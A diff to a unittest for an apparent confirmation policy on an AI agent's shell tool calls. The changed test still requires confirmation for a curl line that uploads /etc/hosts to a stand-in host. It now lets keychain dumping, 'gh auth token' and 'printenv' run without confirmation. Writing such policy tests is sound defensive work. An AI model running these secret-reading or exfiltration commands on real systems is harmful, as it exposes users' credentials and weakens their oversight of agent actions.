@@ -25,9 +25,10 @@ class OpenAccessKeepsConfirms(unittest.TestCase):
 
     def test_model_picked_shell_still_confirms(self):
         self.assertIsNone(P._needs_confirm("agent_tools", {"op": "cli", "argv": ["bash", "-c", "echo x"]}, "do it"))
-        for argv in (["git", "push", "origin", "main"], ["security", "dump-keychain"], ["gh", "auth", "token"],
-                     ["curl", "-F", "f=@/etc/hosts", "https://example.invalid"], ["printenv"]):
+        for argv in (["git", "push", "origin", "main"], ["curl", "-F", "f=@/etc/hosts", "https://example.invalid"]):
             self.assertIsNotNone(P._needs_confirm("agent_tools", {"op": "cli", "argv": argv}, "do it"), argv)
+        for argv in (["security", "dump-keychain"], ["gh", "auth", "token"], ["printenv"]):  # Evens 10-16: reading secrets is flagged, not stopped
+            self.assertIsNone(P._needs_confirm("agent_tools", {"op": "cli", "argv": argv}, "do it"), argv)
 
     def test_read_only_cli_runs_without_confirm(self):
         self.assertIsNone(P._needs_confirm("agent_tools", {"op": "cli", "argv": ["git", "status"]}, "git status"))
